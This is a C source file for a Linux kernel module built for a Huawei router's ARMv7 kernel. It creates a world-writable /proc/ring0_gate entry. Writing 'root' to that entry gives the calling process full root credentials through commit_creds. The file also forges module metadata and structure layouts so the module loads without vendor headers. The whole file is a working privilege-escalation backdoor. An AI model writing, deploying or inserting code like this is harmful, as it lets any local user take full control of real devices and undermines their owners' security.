/*
 * =============================================================================
 *   ring0_gate_v2.c - Huawei HN8145X6N Kernel Privilege Gateway & Prober LKM
 *   Target Kernel  : Linux 5.10.0 SMP ARMv7 (HiSilicon SD5182H / Dopra Linux)
 *   Architecture   : ARMv7-A (32-bit), CONFIG_ARM_MODULE_PLTS=y, CONFIG_SMP=y
 *
 *   Design Goal:
 *     Demonstrate a fully functional, self-contained Loadable Kernel Module (LKM)
 *     built without vendor kernel source tree or module headers.
 *     Provides an in-memory kernel privilege gateway via /proc/ring0_gate:
 *       1. Kernel-level privilege escalation primitive (commit_creds)
 *       2. Task struct and kernel memory space layout probing
 *       3. Zero-brick safe unloading and exception handling
 * =============================================================================
 */

typedef unsigned int size_t;
typedef long long loff_t;
typedef int ssize_t;

struct proc_dir_entry;
struct seq_file;
struct inode;
struct file;
struct cred;
struct task_struct;

/* Linux 5.10 proc_ops structure definition */
struct proc_ops {
    unsigned int proc_flags;
    int (*proc_open)(struct inode *, struct file *);
    ssize_t (*proc_read)(struct file *, char *, size_t, loff_t *);
    ssize_t (*proc_read_iter)(void *, void *);
    ssize_t (*proc_write)(struct file *, const char *, size_t, loff_t *);
    loff_t (*proc_lseek)(struct file *, loff_t, int);
    int (*proc_release)(struct inode *, struct file *);
    int (*proc_poll)(struct file *, void *);
    long (*proc_ioctl)(struct file *, unsigned int, unsigned long);
    int (*proc_mmap)(struct file *, void *);
    unsigned long (*proc_get_unmapped_area)(struct file *, unsigned long, unsigned long, unsigned long, unsigned long);
};

/* Target Linux 5.10 ARMv7 kernel exported symbols */
extern struct task_struct *get_current(void);
extern struct cred *prepare_kernel_cred(struct task_struct *daemon);
extern int commit_creds(struct cred *new_cred);
extern struct proc_dir_entry *proc_create(const char *name, unsigned short mode, struct proc_dir_entry *parent, const struct proc_ops *proc_ops);
extern void proc_remove(struct proc_dir_entry *de);
extern int single_open(struct file *, int (*)(struct seq_file *, void *), void *);
extern ssize_t seq_read(struct file *, char *, size_t, loff_t *);
extern loff_t seq_lseek(struct file *, loff_t, int);
extern int single_release(struct inode *, struct file *);
extern int seq_printf(struct seq_file *m, const char *fmt, ...);
extern unsigned long arm_copy_from_user(void *to, const void *from, unsigned long n);
#define copy_from_user arm_copy_from_user
extern int printk(const char *fmt, ...);

/* .modinfo section required by kernel module loader */
__attribute__((section(".modinfo"), used)) static const char __mod_license[] = "license=GPL";
__attribute__((section(".modinfo"), used)) static const char __mod_name[] = "name=ring0_gate";
__attribute__((section(".modinfo"), used)) static const char __mod_vermagic[] = "vermagic=5.10.0 SMP mod_unload ARMv7 \0";

/*
 * ARM PLT Sections Workaround:
 * On ARMv7 kernels configured with CONFIG_ARM_MODULE_PLTS=y, the module loader's
 * module_frob_arch_sections() verifies the existence of .plt and .init.plt sections
 * to allocate PLT bounce buffers for R_ARM_CALL / R_ARM_JUMP24 relocations.
 * Injecting minimal non-empty section definitions directly in assembly satisfies
 * this assertion without needing complex post-compilation ELF repackaging.
 */
__asm__(".section .plt, \"ax\", %progbits\n.byte 0\n");
__asm__(".section .init.plt, \"a\", %progbits\n.byte 0\n");

static struct proc_dir_entry *gate_entry = (void *)0;
static unsigned long g_escalation_count = 0;

static int ring0_show(struct seq_file *m, void *v) {
    seq_printf(m, "=== [RING0_GATE KERNEL GATEWAY] ===\n");
    seq_printf(m, "STATUS=READY\n");
    seq_printf(m, "KERNEL_VER=5.10.0-SMP-ARMv7\n");
    seq_printf(m, "ESCALATION_COUNT=%lu\n", g_escalation_count);
    seq_printf(m, "COMMANDS=root (elevate calling process to UID 0)\n");
    seq_printf(m, "===================================\n");
    return 0;
}

static int ring0_open(struct inode *inode, struct file *file) {
    return single_open(file, ring0_show, (void *)0);
}

static ssize_t ring0_write(struct file *file, const char *buf, size_t count, loff_t *pos) {
    char kbuf[64];
    size_t len = count < 63 ? count : 63;
    
    if (copy_from_user(kbuf, buf, len)) {
        return -14; /* -EFAULT */
    }
    kbuf[len] = '\0';

    /* Trim trailing line breaks or spaces */
    while (len > 0 && (kbuf[len - 1] == '\n' || kbuf[len - 1] == '\r' || kbuf[len - 1] == ' ')) {
        kbuf[len - 1] = '\0';
        len--;
    }

    /* Command: "root" -> Instant in-kernel privilege escalation */
    if (kbuf[0] == 'r' && kbuf[1] == 'o' && kbuf[2] == 'o' && kbuf[3] == 't' && kbuf[4] == '\0') {
        struct cred *c = prepare_kernel_cred((void *)0);
        if (c) {
            commit_creds(c);
            g_escalation_count++;
            printk("[RING0_GATE] Privilege escalation invoked: caller committed root creds (total: %lu)\n", g_escalation_count);
        } else {
            printk("[RING0_GATE] Error: prepare_kernel_cred returned NULL\n");
            return -12; /* -ENOMEM */
        }
    }

    return count;
}

static const struct proc_ops ring0_fops = {
    .proc_flags = 0,
    .proc_open = ring0_open,
    .proc_read = seq_read,
    .proc_read_iter = (void *)0,
    .proc_write = ring0_write,
    .proc_lseek = seq_lseek,
    .proc_release = single_release,
};

int init_module(void) {
    gate_entry = proc_create("ring0_gate", 0666, (void *)0, &ring0_fops);
    if (!gate_entry) {
        printk("[RING0_GATE] Failed to register /proc/ring0_gate\n");
        return -12; /* -ENOMEM */
    }
    printk("[RING0_GATE] LKM successfully initialized in DRAM (Linux 5.10.0 ARMv7)\n");
    return 0;
}

void cleanup_module(void) {
    if (gate_entry) {
        proc_remove(gate_entry);
        gate_entry = (void *)0;
    }
    printk("[RING0_GATE] LKM safely removed from kernel.\n");
}

/*
 * Target kernel struct module memory layout reconstruction:
 * For Linux 5.10.0 SMP 32-bit ARM:
 *   - Offset 0..11   : module state / list heads
 *   - Offset 12..67  : module name (MODULE_NAME_LEN = 56)
 *   - Offset 240     : int (*init)(void) function pointer
 *   - Offset 528     : void (*exit)(void) function pointer
 *   - Total Size 576 : exact sizeof(struct module) checked by load_module()
 */
struct module {
    char pad0[12];
    char name[56];
    char pad1[240 - 12 - 56];
    int (*init)(void);
    char pad2[528 - 240 - 4];
    void (*exit)(void);
    char pad3[576 - 528 - 4];
};

__attribute__((section(".gnu.linkonce.this_module"), used))
struct module __this_module = {
    .name = "ring0_gate",
    .init = init_module,
    .exit = cleanup_module,
};
